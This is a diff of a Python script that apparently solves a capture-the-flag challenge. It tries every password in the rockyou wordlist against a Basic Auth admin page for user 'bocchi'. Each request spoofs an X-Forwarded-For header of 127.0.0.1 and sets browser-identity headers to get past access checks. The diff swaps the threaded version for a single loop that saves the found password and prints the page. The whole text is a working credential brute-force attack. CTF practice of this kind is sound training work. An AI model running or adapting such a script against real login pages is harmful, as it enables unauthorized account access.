@@ -1,32 +1,31 @@
 import requests
 import numpy as np
-import threading
+
 from tqdm import tqdm
-tn = 5
-lines = open("./debug/rockyou.txt", "r", encoding="latin-1").readlines()
-#lines.reverse()
-splits = np.array_split(lines, tn)
+
+lines = open("./debug/rockyou.txt", "r",encoding="latin-1").readlines()
+
+
 pbar = tqdm(total=len(lines))
 
 
-def request(i):
-    lines = splits[i]
+def request():
     for idx, pw in enumerate(lines):
+        pw=pw.strip()
+        #print(pw)
         r = requests.get('http://ctf.adl.tw:12002/admin',
                          headers={"X-Forwarded-For": "127.0.0.1",
                                   "User-Agent": "STARRYBrowser",
                                   "Accept-Language": "ja-JP"}, auth=("bocchi", pw))
         if r.status_code!=401:
-            print(pw)
+            print('found it:',pw)
+            
             with open('./debug/pw.txt', 'w') as f:
                 f.write(pw)
-            #break
-            exit()
-        #if idx % 100 == (100 * i) / tn:
+            
+            print('\n',r.text)
+            break
         if idx % 100 == 0:
             pbar.update(100)
 
-
-for i in range(tn):
-    t = threading.Thread(target=request, args=(i,))
-    t.start()
+request()
